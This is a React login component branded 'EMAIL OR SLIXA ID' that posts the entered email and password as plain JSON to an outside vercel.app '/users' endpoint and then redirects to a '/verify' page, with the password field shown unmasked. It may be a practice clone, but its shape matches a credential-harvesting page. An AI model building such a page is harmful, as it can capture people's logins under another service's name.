import React from "react";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";

const Login = () => {
  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
  } = useForm();
  let navigate = useNavigate();

  const onSubmit = (data) => {
    const ItemId = {
      Email: data.example,
      Password: data.exampleRequired,
    };
    fetch("https://faruk-slixa-app.vercel.app/users", {
      method: "POST",
      headers: { "Content-type": "application/json" },
      body: JSON.stringify(ItemId),
    })
      .then((res) => res.json())
      .then((result) => navigate("/verify"));
  };

  console.log(watch("example"));
  return (
    <div>
      <div className="container">
        <div>
          <h1 className="text-center pt-3 pb-3">Login</h1>
        </div>
        <div className="row">
          <div className="col-md-4"></div>
          <div className="col-md-4">
            <div className="fredricksburg p-4">
              <form onSubmit={handleSubmit(onSubmit)}>
                {/* register your input into the hook by invoking the "register" function */}
                <div className="invoking ">
                  <label class="EMAILslixa pt-3" for="flexCheckDefault">
                    EMAIL OR SLIXA ID
                  </label>

                  <input
                    className="form-control"
                    placeholder="Email address or username"
                    {...register("example", {
                      required: true,
                      pattern:
                        /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,
                    })}
                  />

                  <label class="EMAILslixa pt-4 " for="flexCheckDefault">
                    Password
                  </label>
                  {/* include validation with required or other standard HTML validation rules */}
                  <div className="pb-5 exampleRequired">
                    <input
                      className="form-control"
                      {...register("exampleRequired", { required: true })}
                    />
                  </div>
                  {/* errors will return when field validation fails  */}
                  {errors.exampleRequired && (
                    <span>This field is required</span>
                  )}
                </div>

                <div className="pt-4">
                  <input className="validation" type="submit" value="Log In" />
                </div>
                <div className="pt-3">
                  <label className="Forgot" htmlFor="">
                    Forgot your password?
                  </label>
                </div>
                <div>
                  <label className="Forgot" htmlFor="">
                    Need an account?
                  </label>
                </div>
              </form>
            </div>
          </div>
          <div className="col-md-4"></div>
        </div>
      </div>
    </div>
  );
};

export default Login;
